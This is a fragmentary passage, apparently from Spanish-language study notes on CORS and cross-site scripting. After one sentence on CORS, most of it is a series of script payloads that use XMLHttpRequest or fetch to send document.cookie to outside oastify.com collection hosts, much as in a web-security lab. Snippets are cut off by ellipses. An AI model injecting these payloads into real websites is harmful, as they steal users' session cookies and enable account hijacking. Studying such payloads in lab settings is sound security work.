...
Un ejemplo de `CORS` sería el código `JavaScript` del `front-end`, desde `https://domain-a.com` utiliza `XMLHttpRequest` para realizar una solicitud a `https://domain-b.com/data.json`
...
<script>
    ...
    request.open('POST', 'https://lf4spwr5be5vcxtn56uquhp4yv4qsgg5.oastify.com', true);
...
<script>
    var request = new XMLHttpRequest();
    request.open('GET', 'https://gk4nurw0g9aqhsyia1zlzcuz3q9lxcl1.oastify.com/cookie=' + document.cookie, false);
    request.send();
</script>
```
...
```
<script>
    fetch('https://gk4nurw0g9aqhsyia1zlzcuz3q9lxcl1.oastify.com', {
        method: 'POST',
        mode: 'no-cors',
...
```
<script>
  fetch("https://0vw75b7krtlasc92lla5aw5jeaka8cw1.oastify.com?cookie=" + document.cookie, {
    method: 'GET',
    mode: 'no-cors'
  });
</script>
...
```
<script>
    fetch('https://vut2466fqok5r78xkg909r4ed5j77xvm.oastify.com?cookie=' + document.cookie);
</script>
```
...
```
<script>
    fetch('http://vut2466fqok5r78xkg909r4ed5j77xvm.oastify.com?cookie=' + document.cookie);
</script>
```
